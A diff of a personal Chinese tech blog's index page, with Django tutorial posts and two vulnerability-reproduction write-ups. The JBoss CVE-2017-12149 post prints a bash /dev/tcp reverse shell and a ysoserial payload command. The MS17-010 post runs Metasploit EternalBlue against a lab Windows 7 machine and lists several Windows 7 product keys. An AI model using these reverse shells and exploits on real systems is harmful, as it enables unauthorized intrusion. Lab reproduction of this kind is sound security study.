+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-Python" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Django---简单博客搭建（2）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo Test">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/Django---简单博客搭建（2）/" itemprop="url">Django---简单博客搭建（2）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="博客页面分类："><a href="#博客页面分类：" class="headerlink" title="博客页面分类："></a>博客页面分类：</h4><p>1.博客主页面<br>2.博客文章内容页面<br>3.博客撰写页面</p>
+<h4 id="主页面内容："><a href="#主页面内容：" class="headerlink" title="主页面内容："></a>主页面内容：</h4><ol>
+<li>文章标题列表，超链接</li>
+<li>取出数据库中所有文章对象</li>
+<li>将文章对象打包成列表，传递到前端</li>
+<li>前端页面把文章以标题超链接的形式逐个列出</li>
+</ol>
+<ul>
+<li><p>后端 views.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.shortcuts import render</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line">from . import models</span><br><span class="line"></span><br><span class="line"># 获取所有文章</span><br><span class="line">def index(request):</span><br><span class="line">articles = models.Article.objects.all() # 返回django内置的查询结果的集合对象，类似于列表</span><br><span class="line">return render(request,&apos;blog/index.html&apos;,&#123;&apos;articles&apos;:articles&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>前端 index.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--撰写博客入口--&gt;</span><br><span class="line">&lt;h2&gt;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;编写新文章&lt;/a&gt;</span><br><span class="line">&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--文章列表--&gt;</span><br><span class="line">&lt;h3&gt;</span><br><span class="line">文章列表：&lt;br&gt;</span><br><span class="line">&#123;% for article in articles %&#125;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;&#123;&#123; article.title &#125;&#125;&lt;/a&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="发表博客按钮（超链接）博客文章内容页面"><a href="#发表博客按钮（超链接）博客文章内容页面" class="headerlink" title="发表博客按钮（超链接）博客文章内容页面"></a>发表博客按钮（超链接）博客文章内容页面</h4><ol>
+<li>利用文章 ID 获取单个文章对象</li>
+</ol>
+<ul>
+<li>后端 view.py<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.shortcuts import render</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line">from . import models</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line">articles = models.Article.objects.all() # 返回django内置的查询结果的集合对象，类似于列表</span><br><span class="line">return render(request,&apos;blog/index.html&apos;,&#123;&apos;articles&apos;:articles&#125;)</span><br><span class="line"></span><br><span class="line"># 获取文章对象</span><br><span class="line">def article_page(request,article_id):</span><br><span class="line">article = models.Article.objects.get(pk=article_id)</span><br><span class="line">return render(request,&apos;blog/article_page.html&apos;,&#123;&apos;article&apos;:article&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ol start="2">
+<li>编写显示文章内容页面的前端</li>
+</ol>
+<ul>
+<li>前端 articl_page.html<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--显示单个文章标题和内容--&gt;</span><br><span class="line">&lt;h1&gt;&#123;&#123;article.title&#125;&#125;&lt;/h1&gt;&lt;br&gt;</span><br><span class="line">&lt;h3&gt;&#123;&#123;article.content&#125;&#125;&lt;/h3&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;!--修改文章链接--&gt;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;修改文章&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ol start="3">
+<li>修改 URL 配置</li>
+</ol>
+<ul>
+<li>urls.py<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.conf.urls import url</span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">url(r&apos;^index/$&apos;, views.index), </span><br><span class="line">url(r&apos;^article/(?P&lt;article_id&gt;[0-9]+)$&apos;, views.article_page), </span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-Python" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Django--（Templates）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo Test">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/Django--（Templates）/" itemprop="url">Django--（Templates）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <ol>
+<li>在APP的根目录（应用）下创建名叫 Templates 的目录</li>
+<li>在 Templates 目录下创建 HTML 文件</li>
+<li>在 views.py 中返回 render（）</li>
+</ol>
+<ul>
+<li>views.py<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from django.shortcuts import render</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line">return render(request,&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line">render(request,&apos;模板文件&apos;,context)</span><br><span class="line"># 前两个参数为必须，第三个参数作用是传送数据到前端，支持dict类型参数，该字典是后台传递到模板的参数，键为参数名，在模板中使用&#123;&#123;参数名&#125;&#125;来直接使用</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>Django 查找 Templates 规则：<br><code>Django</code> 按照 <code>INSTALLED_APPS</code>中的添加顺序查找 <code>Templates</code><br>不同APP下<code>Template</code>目录中的同名<code>.html</code>文件会造成冲突</p>
+<p>解决方案：<br>在 APP 的<code>Templates</code>目录下创建以 <code>APP</code>名为名称的目录，将<code>HTML</code> 文件放入新创建的目录下</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-Python" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Django--（admin）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo Test">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/Django--（admin）/" itemprop="url">Django--（admin）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <ul>
+<li><p>Admin 简介</p>
+<blockquote>
+<p>Admin 是 Django 自带的一个功能强大的自动化数据管理界面<br>被授权的用户可直接在 Admin 中管理数据库<br>Django 提供许多针对 Admin 的定制功能</p>
+</blockquote>
+</li>
+<li><p>Admin 配置</p>
+<blockquote>
+<p>cmd 创建 admin 用户<br>执行 python manage.py createsuperuser<br>密码：admin123..<br>admin 入口：localhost:8000/admin/<br>默认英文界面，修改 settings.py 中的 LANGUAGE_CODE = ‘zh_Hans’ 可变更中文界面</p>
+</blockquote>
+</li>
+<li><p>配置应用</p>
+<blockquote>
+<p>在应用下 admin.py 中引入应用自身的 models 模块（或里面的模型类）<br>编辑 admin.py :<br>from django.contrib import admin<br>from models import Article<br>admin.site.register(Article)</p>
+</blockquote>
+</li>
+<li><p>修改数据默认显示名称</p>
+<blockquote>
+<p>在 models.py 的 Article 类中添加一个方法<br>python3 使用 def <strong>str</strong>(self):<br>return self.title<br>python2 使用 def <strong>unicode</strong>(self):<br>return self.title</p>
+</blockquote>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-漏洞复现" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）复现/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo Test">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）复现/" itemprop="url">JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）复现</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 <code>HttpInvoker</code>组件中的 <code>ReadOnlyAccessFilter</code>过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
+<h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><ol>
+<li>运行测试环境<blockquote>
+<p>cd /vulhub-master/jboss/CVE-2017-12149<br>docker-compose up -d</p>
+</blockquote>
+</li>
+</ol>
+<p>访问 <code>http://本机ip:8080</code>查看<code>Jboss</code>默认页面</p>
+<ol start="2">
+<li>编写反弹 shell 命令<br>使用 bash 进行反弹shell，但由于<code>Runtime.getRuntime().exec()</code>中不能使用管道符等bash需要的方法，需要用进行一次编码。</li>
+</ol>
+<p>工具：<a href="http://jackson.thuraisamy.me/runtime-exec-payloads.html" target="_blank" rel="noopener">http://jackson.thuraisamy.me/runtime-exec-payloads.html</a></p>
+<blockquote>
+<p>bash -i &gt;&amp; /dev/tcp/攻击机ip/监听port 0&gt;&amp;1</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-36d3b34c36ad29d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
+<ol start="3">
+<li><p>生成序列化数据<br>使用 <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a> 来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>发送 POC<br>生成好的POC即为<code>poc.ser</code>，将这个文件作为<code>POST Body</code>发送至<code>/invoker/readonly</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-1c65c1a767013d2c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
+</li>
+<li><p>成功反弹到 <code>shell</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-2bcc431fc7f09e9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
+</li>
+</ol>
+<h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h4><ol>
+<li>不需要 http-invoker.sar 组件的用户可直接删除此组件。</li>
+<li>添加如下代码至 <code>http-invoker.sar</code> 下 <code>web.xml</code> 的 <code>security-constraint</code> 标签中，对 <code>http invoker</code> 组件进行访问控制：<code>&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</code></li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-漏洞复现" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/MS17-010漏洞复现/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo Test">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/MS17-010漏洞复现/" itemprop="url">MS17-010漏洞复现</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><p>攻击机 kali<br>靶机 Windows7（需要关闭防火墙）</p>
+<h4 id="漏洞复现过程"><a href="#漏洞复现过程" class="headerlink" title="漏洞复现过程"></a>漏洞复现过程</h4><ol>
+<li>启动msf终端<blockquote>
+<p>msfconsole</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-a40d5dc36622cf4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
+<ol start="2">
+<li>搜索与ms17-010漏洞有关的代码库<blockquote>
+<p>search ms17_010</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-46c074bd09fb361d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
+<ol start="3">
+<li>使用<code>exp</code>代码<blockquote>
+<p>use exploit/windows/smb/ms17_010_eternablue</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-368e43d7fde305bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
+<ol start="4">
+<li>显示代码参数选项<blockquote>
+<p>show options</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-163127c878051cbc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
+<ol start="5">
+<li>设置目标IP地址<blockquote>
+<p>set RHOST X.X.X.X</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-ff00c01330211dda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
+<ol start="6">
+<li>执行攻击代码<blockquote>
+<p>exploit</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-32ee82b38b69d83d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
+<p>成功拿到win7 shell</p>
+<ul>
+<li>附上制作 Windows 7 虚拟机需要的序列号(任选其一即可)<blockquote>
+<p>KH2J9-PC326-T44D4-39H6V-TVPBY<br>TEP9Y-VCY3P-VVH3T-8XXCC-MF4YK<br>236TW-X7781-8MV9F-937GT-QVKBB<br>87VT2-FY2XW-F7K39-W3T8R-XMFGF<br>6K2KY-BFH24-PJW6W-9GK29-TMPWP<br>RHTBY-WWY6D-QJRJ9-JGQ3X-Q2289</p>
+</blockquote>
+</li>
+</ul>
+
           
         
       
@@ -683,6 +1797,10 @@ Nmap 扫描 -sV 参数对其服务版本进行识别
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -726,7 +1844,7 @@ Nmap 扫描 -sV 参数对其服务版本进行识别
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">25</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
